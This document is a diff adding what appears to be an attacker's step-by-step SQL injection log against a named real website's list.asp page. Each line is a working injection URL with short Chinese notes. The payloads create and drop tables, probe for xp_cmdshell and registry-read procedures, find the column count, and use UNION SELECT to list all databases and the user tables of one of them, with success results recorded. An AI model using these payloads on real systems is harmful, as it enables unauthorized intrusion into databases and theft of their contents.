@@ -1,0 +1,19 @@
+//创建一个临时表
+http://user.nipic.com/club/list.asp?id=12;create table test2 (dstr nvarchar(3000));-- 
+//判断创建是否成功
+http://user.nipic.com/club/list.asp?id=12 and exists(select * from test2);-- 
+//测试一下删除表
+http://user.nipic.com/club/list.asp?id=12;drop table test2;-- 
+检测XP_CMDSHELL（CMD命令）：
+http://user.nipic.com/club/list.asp?id=12 and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'xp_cmdshell')
+测试OK
+检测XP_REGREAD（注册表读取功能）：
+http://user.nipic.com/club/list.asp?id=12 and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'xp_regread')
+测试OK
+//测试字段数
+http://user.nipic.com/club/list.asp?id=12 order by 22;-- 
+总共22个字段
+//获取所有数据库
+http://user.nipic.com/club/list.asp?id=12 and 2<1 union select 1,2,3,4,5,name,7,8,9,10, 11,12,13,14,15,16,17,18,19,20,21 from master.dbo.sysdatabases;-- 
+NipicClub库所有表
+http://user.nipic.com/club/list.asp?id=12 and 2<1 union select id,2,3,4,5,name,7,8,9,10, 11,12,13,14,15,16,17,18,19,20,21 from NipicClub.dbo.sysobjects where xtype='U';-- 
